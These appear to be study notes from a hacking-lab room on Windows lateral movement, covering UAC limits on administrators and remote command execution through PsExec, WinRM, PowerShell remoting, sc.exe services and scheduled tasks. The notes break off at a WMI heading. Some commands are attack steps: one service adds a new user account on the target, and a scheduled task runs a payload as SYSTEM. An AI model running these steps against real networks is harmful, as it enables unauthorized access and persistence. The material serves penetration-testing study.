# Lateral Movement and Pivoting

## Moving Through the Network
### Adminitstrators and UAC
Two types of administrtors:
- Local accounts part of the local Administrators group
- Domain accounts part of the local Administrators group  

User Account Control([UAC](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)) restricts local administrators privirege.  

- By default, local administrators won't be able to remotely connect to a machine and perform administrative tasks unless using an interactive session through RDP.   
- Domain accounts with local administration privileges won't be subject to the same treatment and will be logged in with full administrative privileges.  

## Spawning Processes Remotely

### Psexec
- Ports: 445/TCP (SMB)
- Required Group Memberships: Administrators  

Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).  

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### Remote Process Creation Using WinRM
- Ports: 5985/TCP (WinRM HTTP) or 5986/TCP(WinRM HTTPS)
- Required Group Memberships: Remote Management Users  

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.  
To connect to a remote Powershell session from the command line, we can use the following command:  
`winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`  
We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:
```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```  
Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:  
```
Enter-PSSession -Computername TARGET -Credential $credential
```  
Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:
```
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

### Remotely Creating Services Using sc
- Ports:
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- Required Group Memberships: Administrators  
We can create and start a service named "THMservice" using the following commands:  
```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```
To stop and delete the service, we can then execute the following commands:
```
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

### Creating Scheduled Tasks Remotely
To create a task named THMtask1, we can use the following commands:  
```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```
Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.  
Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:
```
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

## Moving Laterally Using WMI
WMI(Windows Management Instrumentation) is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices.

### Connecting to WMI From Powershell
